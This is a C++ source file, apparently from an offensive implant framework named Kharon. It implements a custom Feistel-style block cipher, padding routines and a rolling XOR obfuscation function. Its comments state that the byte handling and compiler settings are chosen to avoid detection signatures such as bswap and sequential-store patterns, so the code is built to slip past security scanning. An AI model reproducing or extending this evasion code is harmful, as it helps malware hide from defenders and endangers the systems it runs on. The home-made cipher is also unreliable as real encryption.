#include <Kharon.h>

__attribute__((optimize("O0"), noinline))
auto DECLFN Crypt::Cycle(
    PBYTE      Block,
    LOKY_CRYPT Mode
) -> VOID {
    // Use pointer arithmetic instead of byte shifts to avoid bswap signature
    UINT32 Left = 0;
    UINT32 Right = 0;
    
    // Manual byte-by-byte load — prevents bswap optimization
    unsigned char* p = (unsigned char*)&Left;
    p[3] = Block[0]; p[2] = Block[1]; p[1] = Block[2]; p[0] = Block[3];
    
    unsigned char* q = (unsigned char*)&Right;
    q[3] = Block[4]; q[2] = Block[5]; q[1] = Block[6]; q[0] = Block[7];

    volatile INT32 rnds = NUM_ROUNDS;
    
    if (Mode == LokyEnc) {
        for (INT32 i = 0; i < rnds; i++) {
            UINT32 k = (UINT32)this->LokKey[i % sizeof(this->LokKey)];
            UINT32 t = Right;
            Right = Left ^ (t + k);
            Left = t;
        }
    } else {
        for (INT32 i = rnds - 1; i >= 0; i--) {
            UINT32 k = (UINT32)this->LokKey[i % sizeof(this->LokKey)];
            UINT32 t = Left;
            Left = Right ^ (t + k);
            Right = t;
        }
    }

    // Manual byte-by-byte store — prevents sequential store pattern
    unsigned char* ol = (unsigned char*)&Left;
    unsigned char* or_ = (unsigned char*)&Right;
    Block[0] = ol[3]; Block[1] = ol[2]; Block[2] = ol[1]; Block[3] = ol[0];
    Block[4] = or_[3]; Block[5] = or_[2]; Block[6] = or_[1]; Block[7] = or_[0];
}

auto DECLFN Crypt::CalcPadding(
    ULONG Length
) -> ULONG {
    ULONG PadLen = (Length % BLOCK_SIZE == 0) ? BLOCK_SIZE : (BLOCK_SIZE - (Length % BLOCK_SIZE));
    return Length + PadLen;
}

auto DECLFN Crypt::AddPadding(
    PBYTE Block,
    ULONG Length,
    ULONG TotalSize
) -> VOID {
    UCHAR PadLen = (UCHAR)(TotalSize - Length);
    for (ULONG i = Length; i < TotalSize; ++i) {
        Block[i] = PadLen;
    }
}

auto DECLFN Crypt::Decrypt(
    PBYTE Block,
    ULONG &Length
) -> VOID {
    if (Length < BLOCK_SIZE) return;

    for (ULONG i = 0; i < Length; i += BLOCK_SIZE) {
        this->Cycle(Block + i, LokyDec);
    }

    this->RmPadding(Block, Length);
}

auto DECLFN Crypt::RmPadding(
    PBYTE Block,
    ULONG &Length
) -> VOID {
    if (Length < BLOCK_SIZE) return;

    UCHAR PadLen = Block[Length - 1];

    if (PadLen == 0 || PadLen > BLOCK_SIZE || Length < PadLen) return;

    for (ULONG i = Length - PadLen; i < Length; ++i) {
        if (Block[i] != PadLen) return;
    }

    Length -= PadLen;
}

auto DECLFN Crypt::Encrypt(
    PBYTE Block,
    ULONG Length
) -> VOID {
    ULONG TotalSize = this->CalcPadding(Length);
    this->AddPadding(Block, Length, TotalSize);

    for (ULONG i = 0; i < TotalSize; i += BLOCK_SIZE) {
        this->Cycle(Block + i, LokyEnc);
    }
}


auto DECLFN Crypt::Xor( 
    _In_opt_ BYTE*  Bin, 
    _In_     SIZE_T BinSize
) -> VOID {
    for ( SIZE_T i = 0x00, j = 0x00; i < BinSize; i++, j++ ) {
        if ( j == sizeof( this->XorKey ) )
            j = 0x00;

        if ( i % 2 == 0 )
            Bin[i] = Bin[i] ^ this->XorKey[j];
        else
            Bin[i] = Bin[i] ^ this->XorKey[j] ^ j;
    }
}
